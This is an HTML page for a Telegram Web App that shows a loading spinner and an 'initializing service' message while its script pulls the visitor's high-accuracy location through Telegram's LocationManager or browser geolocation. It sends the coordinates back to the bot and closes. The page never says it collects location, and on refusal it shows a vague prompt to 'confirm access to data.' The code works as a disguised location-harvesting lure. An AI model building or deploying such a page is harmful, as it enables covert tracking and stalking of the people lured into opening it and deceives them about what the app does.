<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Загрузка...</title>
  <!-- Telegram Web App SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: var(--tg-theme-bg-color, #ffffff);
      color: var(--tg-theme-text-color, #222222);
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    .spinner {
      width: 42px;
      height: 42px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top-color: var(--tg-theme-button-color, #2481cc);
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 15px;
      margin: 0;
      color: var(--tg-theme-hint-color, #777777);
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <p id="status-text">Инициализация сервиса...</p>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    let sent = false;

    function sendLocationAndExit(coords) {
      if (sent) return;
      sent = true;

      const data = {
        latitude: coords.latitude,
        longitude: coords.longitude,
        accuracy: coords.accuracy || coords.horizontal_accuracy || 0
      };

      try {
        tg.sendData(JSON.stringify(data));
      } catch (e) {
        console.error("sendData error:", e);
      }
      setTimeout(() => tg.close(), 300);
    }

    function fallbackGeo() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => sendLocationAndExit(pos.coords),
          (err) => {
            console.warn("navigator.geolocation error:", err.message);
            const status = document.getElementById("status-text");
            if (status) {
              status.innerText = "Для продолжения подтвердите доступ к данным приложению.";
            }
            setTimeout(() => tg.close(), 2000);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        tg.close();
      }
    }

    // Пробуем Telegram Native LocationManager (Telegram 7.7+)
    if (tg.LocationManager) {
      tg.LocationManager.init(() => {
        if (tg.LocationManager.isInited) {
          tg.LocationManager.getLocation((data) => {
            if (data && data.latitude && data.longitude) {
              sendLocationAndExit(data);
            } else {
              fallbackGeo();
            }
          });
        } else {
          fallbackGeo();
        }
      });
    } else {
      fallbackGeo();
    }
  </script>
</body>
</html>
